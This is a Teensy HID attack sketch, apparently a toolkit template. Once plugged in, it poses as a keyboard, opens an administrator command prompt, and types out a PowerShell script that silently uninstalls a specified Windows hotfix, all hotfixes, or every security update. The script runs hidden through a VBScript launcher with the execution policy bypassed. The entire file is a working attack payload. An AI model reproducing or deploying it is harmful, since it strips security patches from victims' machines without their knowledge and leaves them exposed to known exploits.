#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $hfs = Get-HotFix > %temp%\\ru.ps1");
  Keyboard.println("echo $KBID = \"INPUT0\" >> %temp%\\ru.ps1");
  Keyboard.println("echo  foreach ($hf in $hfs) {>> %temp%\\ru.ps1");
  Keyboard.println("echo if ($KBID -eq $hf.HotfixId) { >> %temp%\\ru.ps1");
  Keyboard.println("echo $KBID = $hf.HotfixId.Replace(\"KB\", \"\") >> %temp%\\ru.ps1");
  Keyboard.println("echo $rc = \"wusa.exe /uninstall /kb:$KBID /quiet /norestart\" >> %temp%\\ru.ps1");
  Keyboard.println("echo iex $rc >> %temp%\\ru.ps1");
  Keyboard.println("echo break } >> %temp%\\ru.ps1");
  Keyboard.println("echo if ($KBID -match \"All\") { >> %temp%\\ru.ps1");
  Keyboard.println("echo $kn = $hf.HotfixId.Replace(\"KB\", \"\") >> %temp%\\ru.ps1");
  Keyboard.println("echo $rc = \"wusa.exe /uninstall /kb:$kn /quiet /norestart\" >> %temp%\\ru.ps1");
  Keyboard.println("echo iex $rc } >> %temp%\\ru.ps1");
  Keyboard.println("echo if ($KBID -match \"Security\") { >> %temp%\\ru.ps1");
  Keyboard.println("echo if ($hf.Description -match \"Security\") {>> %temp%\\ru.ps1");
  Keyboard.println("echo $ks = $hf.HotfixId.Replace(\"KB\", \"\") >> %temp%\\ru.ps1");
  Keyboard.println("echo $rc = \"wusa.exe /uninstall /kb:$ks /quiet /norestart\" >> %temp%\\ru.ps1");
  Keyboard.println("echo  iex $rc } } }>> %temp%\\ru.ps1");

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\ru.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\ru.ps1\"),0,true >> %temp%\\ru.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\ru.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS

